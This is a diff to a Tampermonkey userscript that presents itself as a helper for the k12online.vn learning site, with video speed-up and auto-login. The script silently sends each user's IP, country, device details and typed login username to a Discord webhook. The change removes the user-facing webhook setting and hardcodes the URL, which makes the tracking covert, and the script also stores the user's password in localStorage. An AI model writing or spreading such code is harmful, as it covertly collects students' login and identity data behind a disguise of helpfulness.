@@ -1,8 +1,8 @@
 // ==UserScript==
-// @name K12 Helper Pro - Danhvux Port 8000 (Silent Webhook v22.2)
+// @name K12 Helper Pro - Danhvux Port 8000 (Silent Webhook v22.3)
 // @namespace http://tampermonkey.net/
-// @version 22.2
-// @description K12 Helper Pro đầy đủ + Discord Webhook chạy NGẦM (Session + Login tracking)
+// @version 22.3
+// @description K12 Helper Pro đầy đủ + Discord Webhook chạy NGẦM (URL hardcoded trong code)
 // @author Danhvux
 // @match *://*.k12online.vn/*
 // @grant GM_xmlhttpRequest
@@ -14,6 +14,10 @@
 (function () {
     'use strict';
 
+    // ==================== NHẬP URL WEBHOOK TẠI ĐÂY (CHỈ SỬA DÒNG NÀY) ====================
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/THAY_BẰNG_URL_CỦA_BẠN_VÀO_ĐÂY";
+    // ===================================================================================
+
     const BLACKLIST_API = 'http://localhost:8000/blacklist';
 
     let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
@@ -23,13 +27,12 @@
         user: '',
         pass: '',
         isDarkMode: true,
-        toastPos: 'top-right',
-        webhookURL: ''   // Dán URL vào đây → webhook tự chạy ngầm
+        toastPos: 'top-right'
     };
 
     const saveConfig = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));
 
-    // ====================== DISCORD WEBHOOK - CHẠY ẨN ======================
+    // ====================== DISCORD WEBHOOK CHẠY ẨN ======================
     let userIP = null;
     let userCountry = 'Unknown';
     let deviceInfo = null;
@@ -40,7 +43,7 @@
     });
 
     const sendDiscordWebhook = (title, description, color = 0x7289da, fields = []) => {
-        if (!config.webhookURL || !config.webhookURL.startsWith('https://discord.com/api/webhooks/')) return;
+        if (!WEBHOOK_URL || !WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) return;
 
         const payload = {
             username: "K12 Helper Pro",
@@ -51,19 +54,18 @@
                 color: color,
                 timestamp: new Date().toISOString(),
                 fields: fields,
-                footer: { text: "Danhvux • K12 Helper Pro v22.2" }
+                footer: { text: "Danhvux • K12 Helper Pro v22.3" }
             }]
         };
 
         GM_xmlhttpRequest({
             method: "POST",
-            url: config.webhookURL,
+            url: WEBHOOK_URL,
             headers: { "Content-Type": "application/json" },
             data: JSON.stringify(payload)
         });
     };
 
-    // Khởi tạo thông tin IP, Quốc gia, Thiết bị và gửi Session Started
     const initSilentTracking = async () => {
         deviceInfo = getDeviceInfo();
 
@@ -83,14 +85,14 @@
 
             if (geoRes && geoRes.responseText) {
                 const geo = JSON.parse(geoRes.responseText);
-                userCountry = geo.country_name || geo.country || geo.region || 'Unknown';
+                userCountry = geo.country_name || geo.country || 'Unknown';
             }
         } catch (e) {
             userIP = 'Unknown';
         }
 
-        // Gửi thông báo Session Started (ẩn)
-        if (config.webhookURL) {
+        // Gửi Session Started
+        if (WEBHOOK_URL) {
             const fields = [
                 { name: '📍 IP', value: userIP || 'N/A', inline: true },
                 { name: '🌍 Quốc gia', value: userCountry, inline: true },
@@ -102,17 +104,15 @@
         }
     };
 
-    // Theo dõi đăng nhập (ẩn)
     const trackLoginAttempt = () => {
         document.addEventListener('submit', (e) => {
-            if (!config.webhookURL) return;
+            if (!WEBHOOK_URL) return;
 
             const form = e.target;
-            const usernameInput = form.querySelector('input[name="username"], input[name="email"], input[placeholder*="Tài khoản"], input[placeholder*="Email"], input[placeholder*="username"]');
+            const usernameInput = form.querySelector('input[name="username"], input[name="email"], input[placeholder*="Tài khoản"], input[placeholder*="Email"]');
 
             if (usernameInput) {
                 const loginUser = usernameInput.value.trim() || config.user || 'Unknown';
-
                 setTimeout(() => {
                     const fields = [
                         { name: '📍 IP', value: userIP || 'N/A', inline: true },
@@ -126,7 +126,7 @@
         }, true);
     };
 
-    // ====================== CÁC CHỨC NĂNG CŨ ======================
+    // ====================== TURBO & BYPASS ======================
     const runTurbo = () => {
         const v = document.querySelector('video');
         if (v && config.speed > 1) {
@@ -137,6 +137,7 @@
     };
     setInterval(runTurbo, 1000);
 
+    // ====================== SECURITY SYSTEM ======================
     const startSecuritySystem = () => {
         return new Promise((resolve) => {
             fetch('https://api.ipify.org?format=json')
@@ -151,12 +152,8 @@
                                 if (bannedList.includes(data.ip)) {
                                     renderBannedScreen(data.ip);
                                     resolve(false);
-                                } else {
-                                    resolve(true);
-                                }
-                            } catch (e) {
-                                resolve(true);
-                            }
+                                } else resolve(true);
+                            } catch (e) { resolve(true); }
                         },
                         onerror: () => resolve(true)
                     });
@@ -173,6 +170,7 @@
             </div>`;
     };
 
+    // ====================== TOAST ======================
     const showToast = (message, type = 'info', duration = 2500) => {
         const isDark = config.isDarkMode;
         const pos = config.toastPos;
@@ -207,7 +205,7 @@
         }, duration);
     };
 
-    // ====================== KHỞI CHẠY ======================
+    // ====================== KHỞI CHẠY TOÀN BỘ ======================
     startSecuritySystem().then(accessGranted => {
         if (!accessGranted) return;
 
@@ -215,7 +213,7 @@
         initSilentTracking();
         trackLoginAttempt();
 
-        // Tạo style
+        // Tạo CSS
         const style = document.createElement('style');
         const updateCSS = () => {
             const isDark = config.isDarkMode;
@@ -263,7 +261,7 @@
         document.head.appendChild(style);
         updateCSS();
 
-        // Tạo panel
+        // Tạo Panel
         const panel = document.createElement('div');
         panel.id = 'dv-panel';
         panel.innerHTML = `
@@ -312,14 +310,10 @@
                     <input type="range" id="w-range" class="slider" min="280" max="600" value="${config.width}">
                     <input type="text" id="u-val" placeholder="Username..." value="${config.user}">
                     <input type="password" id="p-val" placeholder="Password..." value="${config.pass}">
-                    
-                    <div style="margin:20px 0 8px; font-weight:bold; color:#7289da;">DISCORD WEBHOOK (Chạy ngầm)</div>
-                    <input type="text" id="webhook-url" placeholder="https://discord.com/api/webhooks/..." value="${config.webhookURL}" style="margin-bottom:10px;">
-                    <button class="btn" id="test-webhook" style="background:#7289da; color:#fff; margin-bottom:12px;">🧪 TEST WEBHOOK</button>
-                    <button class="btn btn-save" id="btn-save">LƯU CÀI ĐẶT</button>
+                    <button class="btn btn-save" id="btn-save">💾 LƯU CÀI ĐẶT</button>
                 </div>
             </div>
-            <div class="footer">DANHVUX • K12 HELPER PRO v22.2 - Webhook chạy ngầm</div>
+            <div class="footer">DANHVUX • K12 HELPER PRO v22.3 - Webhook chạy ngầm</div>
         `;
         document.body.appendChild(panel);
 
@@ -329,7 +323,7 @@
             if (active) panel.style.height = (panel.querySelector('.header').offsetHeight + panel.querySelector('.tabs').offsetHeight + active.scrollHeight + 40) + 'px';
         };
 
-        // Tab switching
+        // Tab
         panel.querySelectorAll('.tab').forEach(tab => {
             tab.onclick = () => {
                 panel.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
@@ -349,18 +343,8 @@
             config.mainColor = $('#c-pick').value;
             config.user = $('#u-val').value;
             config.pass = $('#p-val').value;
-            config.webhookURL = $('#webhook-url').value.trim();
             saveConfig();
-            showToast('✅ Đã lưu cài đặt! Webhook đang chạy ngầm.', 'success');
-        };
-
-        $('#test-webhook').onclick = () => {
-            if (!config.webhookURL) {
-                showToast('Vui lòng dán URL Webhook Discord trước!', 'error');
-                return;
-            }
-            sendDiscordWebhook('🧪 Test Webhook', 'K12 Helper Pro v22.2 - Webhook hoạt động tốt!', 0x00ff00);
-            showToast('📤 Đã gửi test webhook!', 'success');
+            showToast('✅ Đã lưu cài đặt!', 'success');
         };
 
         $('#v-run').onclick = () => {
@@ -370,9 +354,7 @@
                 v.play();
                 $('#v-display').innerText = "Đang phát...";
                 showToast('Đã bắt đầu phát video', 'success');
-            } else {
-                showToast('Không tìm thấy video element', 'error');
-            }
+            } else showToast('Không tìm thấy video element', 'error');
         };
 
         $('#do-login').onclick = () => {
@@ -383,7 +365,7 @@
                 p.value = config.pass;
                 u.dispatchEvent(new Event('input', { bubbles: true }));
                 p.dispatchEvent(new Event('input', { bubbles: true }));
-                setTimeout(() => document.querySelector('button[type="submit"], button:contains("Đăng nhập")')?.click(), 500);
+                setTimeout(() => document.querySelector('button[type="submit"]')?.click(), 500);
                 showToast('Đang tự động đăng nhập...', 'info');
             } else {
                 showToast('Không tìm thấy form login', 'warning');
@@ -410,7 +392,7 @@
 
         setTimeout(() => {
             adjustHeight();
-            showToast('K12 Helper Pro v22.2 đã chạy - Webhook đang hoạt động ngầm', 'success', 2500);
-        }, 500);
+            showToast('K12 Helper Pro v22.3 đã chạy - Webhook đang hoạt động ngầm', 'success', 2500);
+        }, 600);
     });
 })();
